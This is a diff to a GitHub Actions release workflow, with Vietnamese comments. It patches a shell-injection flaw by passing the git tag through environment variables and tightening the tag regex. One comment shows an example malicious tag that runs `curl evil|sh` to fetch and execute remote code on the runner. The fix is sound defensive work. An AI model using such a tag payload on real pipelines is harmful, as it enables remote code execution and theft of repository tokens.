@@ -48,17 +48,26 @@ jobs:
           echo "Resolved tag: $TAG"
 
       - name: Verify tag starts with v
+        # v3.7.0 FIX (shell injection — audit vòng 22): tag git CÓ THỂ chứa
+        # `$(`, backtick, `;`, `|` (git chỉ cấm space ~ ^ : ? * [ \\ ..).
+        # Interpolate `${{ steps.tag.outputs.tag }}` thẳng vào run: = attacker
+        # có write access push tag `v1.0.1-$(curl evil|sh)` → RCE trên runner
+        # với GITHUB_TOKEN (contents:write). Truyền QUA env → GitHub masking
+        # + shell không re-evaluate. Regex cũng siết charset thẻ về
+        # [A-Za-z0-9._-] (semver prereq/build chuẩn) — chặn payload lạ.
+        env:
+          TAG: ${{ steps.tag.outputs.tag }}
         run: |
-          TAG="${{ steps.tag.outputs.tag }}"
-          if [[ ! "$TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([.-].+)?$ ]]; then
-            echo "::error::Tag '$TAG' does not match v*.*.* pattern"
+          if [[ ! "$TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([.-][A-Za-z0-9._-]+)?$ ]]; then
+            echo "::error::Tag '$TAG' does not match v*.*.* pattern (charset giới hạn [A-Za-z0-9._-] sau patch/prerelease)"
             exit 1
           fi
           echo "Tag format OK: $TAG"
 
       - name: Verify tag version khớp Cargo.toml (chống tag lệch version như v3.4.2)
+        env:
+          TAG: ${{ steps.tag.outputs.tag }}
         run: |
-          TAG="${{ steps.tag.outputs.tag }}"
           VERSION="${TAG#v}"
           CARGO_VERSION=$(grep -E '^version = "[0-9]' Cargo.toml | head -1 | sed -E 's/.*"([0-9][^"]*)".*/\1/')
           echo "Tag version:     $VERSION"
@@ -77,8 +86,10 @@ jobs:
         # giờ chạy → step fail (đã xảy ra với tag v3.4.2: section CHANGELOG
         # chưa có tại commit đó). Fix: dùng `if ! cmd; then` — pattern duy
         # nhất an toàn với errexit.
+        # v3.7.0 FIX: TAG truyền qua env (chống injection — xem step trên).
+        env:
+          TAG: ${{ steps.tag.outputs.tag }}
         run: |
-          TAG="${{ steps.tag.outputs.tag }}"
           # CHANGELOG.md format: "## [x.y.z] — YYYY-MM-DD" header, next "## [" ends section.
           # Match either [v1.0.1] or [1.0.1] (user might omit v prefix in changelog).
           VERSION="${TAG#v}"
@@ -124,19 +135,20 @@ jobs:
           cat /tmp/release_notes.md
 
       - name: Verify tag exists in repo
+        env:
+          TAG: ${{ steps.tag.outputs.tag }}
         run: |
-          TAG="${{ steps.tag.outputs.tag }}"
           if ! git rev-parse -q --verify "refs/tags/$TAG" >/dev/null; then
             echo "::error::Tag '$TAG' does not exist locally"
             exit 1
           fi
-          echo "Tag verified: $(git rev-list -n 1 $TAG)"
+          echo "Tag verified: $(git rev-list -n 1 "$TAG")"
 
       - name: Create GitHub Release
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TAG: ${{ steps.tag.outputs.tag }}
         run: |
-          TAG="${{ steps.tag.outputs.tag }}"
           if gh release view "$TAG" >/dev/null 2>&1; then
             echo "Release $TAG already exists — skipping creation"
             exit 0
@@ -151,8 +163,9 @@ jobs:
 
       - name: Release summary
         if: always()
+        env:
+          TAG: ${{ steps.tag.outputs.tag }}
         run: |
-          TAG="${{ steps.tag.outputs.tag }}"
           echo "## Release Summary" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
           echo "- **Tag**: \`$TAG\`" >> $GITHUB_STEP_SUMMARY
